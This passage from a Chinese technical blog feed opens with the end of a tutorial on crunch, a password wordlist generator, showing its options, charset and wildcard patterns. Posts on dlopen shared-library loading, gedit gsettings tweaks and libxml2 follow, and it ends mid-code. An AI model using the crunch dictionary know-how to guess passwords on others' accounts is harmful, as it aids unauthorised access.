<td>-s</td>
<td>指定crunch从该字符串开始生成字典</td>
</tr>
<tr>
<td>-e</td>
<td>指定crunch从该字符串结束生成字典</td>
</tr>
<tr>
<td>-f</td>
<td>指定一个字符集合,默认路径 <strong>/usr/share/crunch/charset.lst</strong>,作用见下文</td>
</tr>
<tr>
<td>-l</td>
<td>类似于转义的操作</td>
</tr>
<tr>
<td>-o</td>
<td>指定写出文件名,要分清楚 <strong>-o START</strong></td>
</tr>
<tr>
<td>-t</td>
<td>指定生成字典的特殊格式,此参数乃crunch的核心!</td>
</tr>
<tr>
<td>-z</td>
<td>指定压缩生成的字典文件,格式为:gzip, bzip2, lzma, and 7z,且与 <strong>-o START</strong> 使用</td>
</tr>
<tr>
<td>-p</td>
<td>这个参数可以理解为把指定的字符串看做<strong>一个整体</strong>并自由组合</td>
</tr>
</tbody>
</table>
<p><strong>注意:在使用crunch生成字典时,一定要看生成的字典文件的预计大小.比如:[ crunch 1 8 ] 就是输出 1812GB 的数据!! 这样的话硬盘早就撑爆了!!</strong></p>
<h4 id="example1"><a class="markdownIt-Anchor" href="#example1"></a> example1</h4>
<blockquote>
<p>$ crunch 1 8<br />
这将会显示出从 a 到 zzzzzzzz 的数据,也就是1812GB!</p>
</blockquote>
<h4 id="example2"><a class="markdownIt-Anchor" href="#example2"></a> example2</h4>
<blockquote>
<p>$ crunch 1 6 abcdefg -o mydict.lst<br />
这将会生成一个从 a 到 gggggg 的字典文件</p>
</blockquote>
<h4 id="example3"><a class="markdownIt-Anchor" href="#example3"></a> example3</h4>
<blockquote>
<p>$ crunch 8 8 -f /usr/share/crunch/charset.lst <strong>mixalpha-numeric-all-space</strong><br />
这将生成 8位 大小写以及特殊符号的字典</p>
</blockquote>
<p>charset.lst文件如下:<br />
<img src="/uploads/images/linux/file_002.png" alt="img" /></p>
<p>可以看到 mixalpha-numeric-all-space 表示 a-z,A-Z大小写+0-9数字+特殊字符:<br />
<strong>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345 6789!@#$%^&amp;*()-_+=~`[]{}|:;”‘&lt;&gt;,.?/</strong></p>
<p>当指定 <strong>-f</strong> 参数时,必须要指明一个变量,如 <strong>mixalpha-numeric-all-space</strong></p>
<h4 id="example4"><a class="markdownIt-Anchor" href="#example4"></a> example4</h4>
<blockquote>
<p>$ crunch 6 6 -s <strong>xxdog5</strong> -t <strong>@@dog%</strong><br />
注意这里的<strong>格式</strong>,这里以 xxdog5 开始且字符个数必须为6,因为这里最小字符数为6,同时 <strong>-t</strong> 指定的该格式也必须时 <strong>-s</strong> 指定的格式.</p>
</blockquote>
<p>一般地,crunch的4个<strong>通配符</strong>代表了不同的意思</p>
<ul>
<li><strong>@</strong> :表示一个 a-z 小写字符</li>
<li><strong>,</strong> :表示一个 A-Z 大写字符</li>
<li><strong>%</strong> :表示一个 0-9 的数字</li>
<li><strong>^</strong> :表示一个象征符号</li>
</ul>
<p>弄清楚这几个后,上面的也就可以明白了,如果把 xxdog5 换成 xxdoga 就错了</p>
<h4 id="example5"><a class="markdownIt-Anchor" href="#example5"></a> example5</h4>
<blockquote>
<p>$ crunch 3 3 -p abc<br />
这里指定了 -p 参数,意味着吧 a,b,c 这三个字符进行组合 .输出结果为:<br />
abc<br />
acb<br />
bac<br />
bca<br />
cab<br />
cba</p>
</blockquote>
<p>当然这里也可以写成 <strong>crunch 3 3 -p a b c</strong><br />
举一反三,再来一个例子:</p>
<blockquote>
<p>$ crunch 3 3 <strong>-p</strong> i love you<br />
输出:<br />
iloveyou<br />
iyoulove<br />
loveiyou<br />
loveyoui<br />
youilove<br />
youlovei<br />
可看到,该参数吧一个词看做整体来进行匹配</p>
</blockquote>
<h4 id="example6"><a class="markdownIt-Anchor" href="#example6"></a> example6</h4>
<blockquote>
<p>$ crunch 3 3 abc <strong>-o START</strong> -c 10 -z bzip2<br />
最后会生成3个.bz2压缩文件<br />
aaa-baa.txt.bz2<br />
bab-cab.txt.bz2<br />
cac-ccc.txt.bz2</p>
</blockquote>
<p>这里使用参数 <strong>-o START</strong>, <strong>-c</strong> 表示生成的字典文件每个10行数据,直到生成结束,加入 <strong>-z bzip2</strong> 表示然后再把这些 .txt文件压缩成后缀为 .bz2的压缩包</p>
<p><strong>注意,这里没有必要再指定生成字典的文件名!</strong></p>
<h3 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h3>
<p>关于crunch的例子,可以查看文档,文档是个好东西~<br />
熟悉crunch的使用,还是很重要的……</p>
<p>bye~</p>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux dlopen 加载动态链接库</title>
    <url>/linux-dlopen/</url>
    <content><![CDATA[<h3 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h3>
<p>说到加载库,第一个方法就是包含库的头文件,在编译时通过  加载链接库.第二种方法在运行时用函数来加载链接库,获取其中的函数地址并调用.本文讲述后者</p>
<span id="more"></span>
<h3 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h3>
<p>接触过WindowsAPI的应该知道,静态库后缀为,动态链接库后缀,而主要用到函数</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-function">HMODULE WINAPI <span class="hljs-title">LoadLibrary</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ LPCTSTR lpFileName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure>
<p>获取函数地址则是</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-function">FARPROC WINAPI <span class="hljs-title">GetProcAddress</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ LPCSTR  lpProcName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure>
<p>MSDN上的例子</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-comment">//声明函数指针</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span> <span class="hljs-params">(WINAPI *PGNSI)</span><span class="hljs-params">(LPSYSTEM_INFO)</span></span>;<br><span class="hljs-comment">// Call GetNativeSystemInfo if supported or GetSystemInfo otherwise.</span><br>   PGNSI pGNSI;<br>   SYSTEM_INFO si;<br>   <span class="hljs-built_in">ZeroMemory</span>(&amp;si, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(SYSTEM_INFO));<br>   <br>   pGNSI = (PGNSI) <span class="hljs-built_in">GetProcAddress</span>(<br>      <span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;kernel32.dll&quot;</span>)), <br>      <span class="hljs-string">&quot;GetNativeSystemInfo&quot;</span>);<br>   <span class="hljs-keyword">if</span>(<span class="hljs-literal">NULL</span> != pGNSI)<br>   &#123;<br>      <span class="hljs-built_in">pGNSI</span>(&amp;si);<br>   &#125;<br>   <span class="hljs-keyword">else</span> <br>   &#123;<br>       <span class="hljs-built_in">GetSystemInfo</span>(&amp;si);<br>   &#125;<br></code></pre></div></td></tr></table></figure>
<p>由此可看,Windows也实现了对库文件的调用,那么Linux下怎么调用呢?<br />
关于Linux调用库的头文件可以参考 <a href="https://linux.die.net/man/3/dlopen">https://linux.die.net/man/3/dlopen</a></p>
<p>必须包含的头文件 <code>dlfcn.h</code><br />
常用函数:</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-comment">//加载链接库</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">dlopen</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">int</span> flag)</span></span>;<br><span class="hljs-comment">//返回获取的错误</span><br><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">dlerror</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-comment">//获取链接库函数地址</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">dlsym</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *handle, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *symbol)</span></span>;<br><span class="hljs-comment">//卸载链接库</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dlclose</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *handle)</span></span>;<br></code></pre></div></td></tr></table></figure>
<p>注意,在编译时,要指明 <strong>-ldl</strong></p>
<p>除此之外,还有连个也比较有用的函数<strong>dladdr() dlvsym()</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-comment">//获取函数的信息</span><br><span class="hljs-comment">//dladdr() returns 0 on error, and nonzero on success</span><br><span class="hljs-comment">//If no symbol matching addr could be found, then dli_sname and dli_saddr are set to NULL</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dladdr</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *addr, Dl_info *info)</span></span>;<br><span class="hljs-function">The function <span class="hljs-title">dladdr</span><span class="hljs-params">()</span> takes a function pointer <span class="hljs-keyword">and</span> tries to resolve name <span class="hljs-keyword">and</span> file where it is located. Information is stored in the Dl_info structure:</span><br><span class="hljs-function">typedef struct &#123;</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *dli_fname;  <span class="hljs-comment">/* Pathname of shared object that</span><br><span class="hljs-comment">                               contains address */</span><br>    <span class="hljs-keyword">void</span>       *dli_fbase;  <span class="hljs-comment">/* Address at which shared object</span><br><span class="hljs-comment">                               is loaded */</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *dli_sname;  <span class="hljs-comment">/* Name of nearest symbol with address</span><br><span class="hljs-comment">                               lower than addr */</span><br>    <span class="hljs-keyword">void</span>       *dli_saddr;  <span class="hljs-comment">/* Exact address of symbol named</span><br><span class="hljs-comment">                               in dli_sname */</span><br>&#125; Dl_info;<br><span class="hljs-comment">//类似dlsym()</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">dlvsym</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *handle, <span class="hljs-keyword">char</span> *symbol, <span class="hljs-keyword">char</span> *version)</span></span>;<br></code></pre></div></td></tr></table></figure>
<p>下面以一个简单的例子说明</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;dlfcn.h&gt;</span> <span class="hljs-comment">//包含的头文件</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LIB_PATH <span class="hljs-meta-string">&quot;./libtest.so&quot;</span></span><br><span class="hljs-comment">//声明函数指针</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*PFUN)</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ,<span class="hljs-keyword">int</span> )</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    PFUN pf=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//加载链接库</span><br>    <span class="hljs-keyword">void</span> *handle=<span class="hljs-built_in">dlopen</span>(LIB_PATH,RTLD_LAZY);<br>    <span class="hljs-keyword">if</span>(handle==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;load library failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">//dlvsym(handle,&quot;add&quot;,&quot;1.0.0&quot;); </span><br>    <span class="hljs-comment">//获取链接库里函数地址</span><br>    <span class="hljs-comment">//方法1,参考网站上的写法</span><br>    <span class="hljs-comment">//*(void**)(&amp;pf)=dlsym(handle,&quot;add&quot;);</span><br>   <br>    <span class="hljs-comment">//方法2,相当与Windows下的 GetProcAddress() 函数.</span><br>    pf=(PFUN)<span class="hljs-built_in">dlsym</span>(handle,<span class="hljs-string">&quot;sub&quot;</span>);<br>    <span class="hljs-keyword">if</span>(pf!=<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-comment">//获取函数地址信息</span><br>        Dl_info info;<br>       <span class="hljs-keyword">int</span> r= <span class="hljs-built_in">dladdr</span>((<span class="hljs-keyword">void</span>*)pf,&amp;info);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;library filepath:%s\n&quot;</span>\<br>                <span class="hljs-string">&quot;address1:0x%08x\n&quot;</span>\<br>                <span class="hljs-string">&quot;funciton name:%s\n&quot;</span>\<br>                <span class="hljs-string">&quot;address2:0x%08x\n\n&quot;</span>,<br>                info.dli_fname,info.dli_fbase,<br>                info.dli_sname,info.dli_saddr);<br>        <span class="hljs-comment">//0 表示失败</span><br>        <span class="hljs-keyword">if</span>(r==<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;can not get the dl info...\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;get the function address...\n&quot;</span>);<br>        <span class="hljs-comment">//调用函数</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result: %d \n&quot;</span>,<span class="hljs-built_in">pf</span>(<span class="hljs-number">50</span>,<span class="hljs-number">15</span>));<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;can not get the function address...\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//卸载链接库</span><br>    <span class="hljs-built_in">dlclose</span>(handle);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>生成:<code>g++ test.cpp -o out_test -ldl -rdynamic</code><br />
运行<code>./out_test</code><br />
输出结果如下</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">library filepath:./libtest.so<br>address1:<span class="hljs-number">0xeabfa000</span><br>funciton name:sub<br>address2:<span class="hljs-number">0xeabfa7f4</span><br>get the function address...<br>result: <span class="hljs-number">35</span><br></code></pre></div></td></tr></table></figure>
<p>注意上面的库文件<strong><a href="http://libtest.so">libtest.so</a></strong>在当前程序目录下的,代码如下</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> _TEST_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _TEST_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> a-b;<br>&#125;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxnum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> a&gt;b?a:b;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></div></td></tr></table></figure>
<p>然后 <code>g++ -fPIC -shared test.cpp -o libtest.so</code>即可生成动态链接库</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>Gnome gedit配置</title>
    <url>/linux-gnome-setting/</url>
    <content><![CDATA[<p>不知什么原因,gedit找不到首选项,所以也无法直接修改配置,经一番琢磨,记录下过程…</p>
<span id="more"></span>
<h4 id="gsettings"><a class="markdownIt-Anchor" href="#gsettings"></a> gsettings</h4>
<p>本文用到此工具,用它来查询,修改 <strong>Gnome桌面环境配置</strong> ,关于它的用法可以直接查看帮助文档<br />
比如 <code>gsettings list-recursively</code> 就会输出很多信息</p>
<blockquote>
<p>……<br />
org.gnome.gnome-system-monitor.proctree col-20-visible false<br />
org.gnome.gnome-system-monitor.proctree col-10-visible false<br />
org.gnome.gnome-system-monitor.proctree col-6-width 90<br />
org.gnome.gnome-system-monitor.proctree col-22-visible true<br />
org.gnome.gnome-system-monitor.proctree col-14-visible false<br />
org.gnome.gnome-system-monitor.proctree col-13-visible false<br />
org.gnome.gnome-system-monitor.proctree col-11-visible false<br />
org.gnome.gnome-system-monitor.proctree col-7-width 90<br />
org.gnome.gnome-system-monitor.proctree col-16-visible false<br />
org.gnome.gnome-system-monitor.proctree col-15-visible true<br />
org.gnome.gnome-system-monitor.proctree col-10-width 70<br />
org.gnome.gnome-system-monitor.proctree col-8-width 71<br />
org.gnome.gnome-system-monitor.proctree col-18-visible false<br />
org.gnome.GWeather distance-unit ‘km’<br />
……</p>
</blockquote>
<p>获取关于 <strong>gedit</strong> 的配置信息 <code>gsettings list-recursively |grep org.gnome.gedit.preferences.editor</code> 就会输出很多 键值对 .</p>
<h5 id="显示行号"><a class="markdownIt-Anchor" href="#显示行号"></a> 显示行号</h5>
<blockquote>
<p>gsettings set org.gnome.gedit.preferences.editor display-line-numbers true</p>
</blockquote>
<h5 id="高亮当前行"><a class="markdownIt-Anchor" href="#高亮当前行"></a> 高亮当前行</h5>
<blockquote>
<p>gsettings set org.gnome.gedit.preferences.editor highlight-current-line true</p>
</blockquote>
<h5 id="右侧预览"><a class="markdownIt-Anchor" href="#右侧预览"></a> 右侧预览</h5>
<blockquote>
<p>gsettings set org.gnome.gedit.preferences.editor display-overview-map true</p>
</blockquote>
<h5 id="修改主题"><a class="markdownIt-Anchor" href="#修改主题"></a> 修改主题</h5>
<p>其中主题文件为xml格式,位于 <strong>/usr/share/gtksourceview-3.0/styles</strong> ,可以在 <a href="https://github.com/mig/gedit-themes">https://github.com/mig/gedit-themes</a> 获取额外的主题文件.</p>
<blockquote>
<p>gsettings set org.gnome.gedit.preferences.editor scheme <strong>oblivion</strong></p>
</blockquote>
<p>其中 <strong>oblivion</strong> 为主题文件名(除去后缀.xml)</p>
<h5 id="修改字体"><a class="markdownIt-Anchor" href="#修改字体"></a> 修改字体</h5>
<p>在修改字体之前一定要把使用默认字体的设为<code>false</code> ! 不然不会生效</p>
<blockquote>
<p>gsettings set org.gnome.gedit.preferences.editor <strong>use-default-font</strong> <strong>false</strong><br />
gsettings set org.gnome.gedit.preferences.editor editor-font <strong>“Monospace 11”</strong></p>
</blockquote>
<p><code>Monospace</code>为字体名称 , <code>11</code> 为字体大小,之前要有空格</p>
<h4 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h4>
<p>最后,bye……</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>GNOME</tag>
      </tags>
  </entry>
  <entry>
    <title>Libxml2解析XML文件</title>
    <url>/linux-libxml2/</url>
    <content><![CDATA[<p>Libxml2是由C语言开发的一个库，除了解析XML文档外，还可以解析HTML文档（不过这我没有研究）。同时，libxml2库可移植于多个平台<br />
大致可与运行在如下平台： Linux, Unix, Windows, CygWin, MacOS, MacOS X, RISC Os, OS/2, VMS, QNX, MVS, VxWorks</p>
<span id="more"></span>
<p>可以从官网： <a href="http://xmlsoft.org">http://xmlsoft.org</a> 获取最新版本（2.9.8）的libxml2库。Linux下编译也很简单<br />
./configure<br />
make<br />
make install</p>
<p>官网上也有一些例子，以及API接口文档，常见问题，Tutorial，建议去看看。也可以从下载的源文件目录doc中离线浏览</p>
<p>libxml2库囊括了以下的模块，</p>
<h4 id="table-of-contents"><a class="markdownIt-Anchor" href="#table-of-contents"></a> Table of Contents</h4>
<p><strong>DOCBparser</strong>: old DocBook SGML parser<br />
<strong>HTMLparser</strong>: interface for an HTML 4.0 non-verifying parser<br />
<strong>HTMLtree</strong>: specific APIs to process HTML tree, especially serialization<br />
<strong>SAX</strong>: Old SAX version 1 handler, deprecated<br />
<strong>SAX2</strong>: SAX2 parser interface used to build the DOM tree<br />
<strong>c14n</strong>: Provide Canonical XML and Exclusive XML Canonicalization<br />
<strong>catalog</strong>: interfaces to the Catalog handling system<br />
<strong>chvalid</strong>: Unicode character range checking<br />
<strong>debugXML</strong>: Tree debugging APIs<br />
<strong>dict</strong>: string dictionary<br />
<strong>encoding</strong>: interface for the encoding conversion functions<br />
<strong>entities</strong>: interface for the XML entities handling<br />
<strong>globals</strong>: interface for all global variables of the library<br />
<strong>hash</strong>: Chained hash tables<br />
<strong>list</strong>: lists interfaces<br />
<strong>nanoftp</strong>: minimal FTP implementation<br />
<strong>nanohttp</strong>: minimal HTTP implementation<br />
<strong>parser</strong>: the core parser module<br />
<strong>parserInternals</strong>: internals routines and limits exported by the parser.<br />
<strong>pattern</strong>: pattern expression handling<br />
<strong>relaxng</strong>: implementation of the Relax-NG validation<br />
<strong>schemasInternals</strong>: internal interfaces for XML Schemas<br />
<strong>schematron</strong>: XML Schemastron implementation<br />
<strong>threads</strong>: interfaces for thread handling<br />
<strong>tree</strong>: interfaces for tree manipulation<br />
<strong>uri</strong>: library of generic URI related routines<br />
<strong>valid</strong>: The DTD validation<br />
<strong>xinclude</strong>: implementation of XInclude<br />
<strong>xlink</strong>: unfinished XLink detection module<br />
<strong>xmlIO</strong>: interface for the I/O interfaces used by the parser<br />
<strong>xmlautomata</strong>: API to build regexp automata<br />
<strong>xmlerror</strong>: error handling<br />
<strong>xmlexports</strong>: macros for marking symbols as exportable/importable.<br />
<strong>xmlmemory</strong>: interface for the memory allocator<br />
<strong>xmlmodule</strong>: dynamic module loading<br />
<strong>xmlreader</strong>: the XMLReader implementation<br />
<strong>xmlregexp</strong>: regular expressions handling<br />
<strong>xmlsave</strong>: the XML document serializer<br />
<strong>xmlschemas</strong>: incomplete XML Schemas structure implementation<br />
<strong>xmlschemastypes</strong>: implementation of XML Schema Datatypes<br />
<strong>xmlstring</strong>: set of routines to process strings<br />
<strong>xmlunicode</strong>: Unicode character APIs<br />
<strong>xmlversion</strong>: compile-time version informations<br />
<strong>xmlwriter</strong>: text writing API for XML<br />
<strong>xpath</strong>: XML Path Language implementation<br />
<strong>xpathInternals</strong>: internal interfaces for XML Path Language implementation<br />
<strong>xpointer</strong>: API to handle XML Pointers</p>
<p>因为libxml2包含大量函数，实现有不同的方式。这里介绍一些常用的。至于其他的功能有兴趣自己研究吧……<br />
而这里主要用到的为 parser，tree，xmlreader，xmlwriter 这几个模块</p>
<h3 id="parsertree"><a class="markdownIt-Anchor" href="#parsertree"></a> parser/tree</h3>
<h4 id="读取xml文档"><a class="markdownIt-Anchor" href="#读取xml文档"></a> 读取XML文档</h4>
<p>首先介绍xml文档的解析吧，大致调用函数如下</p>
<ul>
<li>xmlReadFile/xmlParseFile 打开一个XML文档并返回一个文档对象指针xmlDocPtr</li>
<li>xmlDocGetRootElement 获取XML文档的根节点xmlNodePtr</li>
<li>获取根节点，以及childNode的名称、属性名/值。而这一步骤可以通过递归实现。</li>
<li>最后由 xmlFreeDoc、xmlCleanupParser 释放所有分配的内存</li>
</ul>
<p>下面给出一个例子（C++）</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span 